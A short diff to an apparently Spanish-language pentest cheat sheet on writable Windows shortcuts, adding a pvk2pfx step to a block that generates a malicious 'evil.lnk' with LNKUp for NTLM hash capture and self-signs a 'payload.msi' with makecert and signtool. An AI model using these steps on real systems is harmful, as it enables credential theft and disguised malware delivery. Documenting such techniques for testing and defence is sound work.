@@ -29,6 +29,7 @@ Un acceso directo escribible que otro usuario ejecuta se puede reemplazar por un
 ```bash
 python LNKUp/generate.py --host localhost --type ntlm --out evil.lnk --execute 'cmd /c ...'
 makecert -pe -n "CN=My SPC" -cy end -sky signature -ic MyCA.cer -iv MyCA.pvk -sv MySPC.pvk MySPC.cer
+pvk2pfx -pvk MySPC.pvk -spc MySPC.cer -pfx MySPC.pfx
 signtool sign /f MySPC.pfx /fd sha256 payload.msi
 ```
 
